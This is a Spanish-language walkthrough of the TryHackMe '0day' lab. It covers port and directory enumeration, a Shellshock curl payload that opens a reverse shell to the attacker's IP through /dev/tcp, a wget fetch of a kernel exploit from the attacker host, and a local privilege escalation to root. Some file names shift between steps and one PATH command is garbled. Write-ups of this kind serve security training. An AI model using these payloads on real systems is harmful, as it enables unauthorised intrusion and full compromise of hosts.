# 0day

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/c7d93313-132b-4d1d-a439-891f724167a1)


***
- Source: https://tryhackme.com/room/0day
- OS: Linux
- Dificultad: Medium
- IP: No estática
- Temas: 
***

- Realizamos un escaneo de puertos:

~~~bash
┌──(kali💀Dedsec)-[~]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.10.34.44
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-08 16:10 EST
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 16:10
Scanning 10.10.34.44 [65535 ports]
Discovered open port 22/tcp on 10.10.34.44
Discovered open port 80/tcp on 10.10.34.44
Completed SYN Stealth Scan at 16:10, 15.75s elapsed (65535 total ports)
Initiating Service scan at 16:10
Scanning 2 services on 10.10.34.44
Completed Service scan at 16:10, 6.47s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.34.44.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 16:10
Completed NSE at 16:10, 0.87s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 16:10
Completed NSE at 16:11, 0.81s elapsed
Nmap scan report for 10.10.34.44
Host is up, received user-set (0.20s latency).
Scanned at 2024-02-08 16:10:36 EST for 24s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.7 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.25 seconds
           Raw packets sent: 76938 (3.385MB) | Rcvd: 76187 (3.047MB)
~~~

- Vemos que tenemos un servicio http por el puerto 80, decidí enumerar directorios pues no vi nada relevante en la página:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/0day]
└─$ gobuster dir -u http://0day.thm -w /usr/share/wordlists/dirb/big.txt -t 50 --add-slash --no-error -k               
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://0day.thm
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess/           (Status: 403) [Size: 285]
/.htpasswd/           (Status: 403) [Size: 285]
/admin/               (Status: 200) [Size: 0]
/backup/              (Status: 200) [Size: 1767]
/cgi-bin/             (Status: 403) [Size: 283]
/cgi-bin//            (Status: 403) [Size: 283]
/css/                 (Status: 200) [Size: 924]
/icons/               (Status: 403) [Size: 281]
/img/                 (Status: 200) [Size: 930]
/js/                  (Status: 200) [Size: 923]
/secret/              (Status: 200) [Size: 109]
/server-status/       (Status: 403) [Size: 289]
/uploads/             (Status: 200) [Size: 0]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
~~~

- Tenemos un directorio `cgi-bin`.
- Si la versión es antigua y hay un binario, podremos aplicar explotación de `ShellShock` desde el lado del servidor.

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/0day]
└─$ gobuster dir -u http://0day.thm/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --add-slash --no-error -k -x pl,sh,cgi
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://0day.thm/cgi-bin/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              pl,sh,cgi
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/test.cgi/            (Status: 200) [Size: 13]
~~~

- Tenemos un binario `test.cgi`.
- Podemos realizar una petición `GET` al binario, aplicando el ataque `shellshock`, a través de ciertos parámetros en el header.

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/0day]
└─$ curl http://0day.thm/cgi-bin/test.cgi -H 'User-Agent: () { :; }; echo; /bin/bash -c "bash -i >& /dev/tcp/10.2.60.167/4444 0>&1"'
~~~

- Nos ponemos en escucha y recibimos una conexión:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/0day]
└─$ nc -lvnp 4444                        
listening on [any] 4444 ...
connect to [10.2.60.167] from (UNKNOWN) [10.10.34.44] 44676
bash: cannot set terminal process group (858): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$ 
~~~

- Realizamos un tratamiento de TTY:

~~~bash
script /dev/null -c bash
^Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
~~~

***

<h3>PrivEsc:</h3>
- Enumerando un poco la máquina encontré algo curioso, una versión de Kernel bastante antigua:

~~~bash
www-data@ubuntu:/tmp$ uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
~~~

- Conozco esta versión, podemos aplicar el [exploit de kernel 37292](https://www.exploit-db.com/exploits/37292)
- Lo transferimos desde nuestra máquina hosteando un server de Python.
- En nuestra máquina atacante:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/0day]
└─$ python3 -m http.server 80
~~~

- En la máquina victima:

~~~bash
www-data@ubuntu:/tmp$ wget http://10.2.60.167/exploit.c
~~~

- Si lo intentamos compilar, vemos que nos arroja un problema:

~~~bash
www-data@ubuntu:/tmp$ gcc exploit2.c exploit2.o
gcc: error trying to exec 'cc1': execvp: No such file or directory
~~~

- Para arreglar esto, exporté el valor de la `PATH` a uno por defecto:

~~~bash
export PATH=$PATH:/usr/bin:/bin:/usr/sbin:/sbin:/usr/lowww-   
~~~

- Y una vez hecho esto, ejecutamos el exploit compilado:

~~~bash
www-data@ubuntu:/tmp$ gcc 37292.c -o exploit.o
www-data@ubuntu:/tmp$ ./exploit.o 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
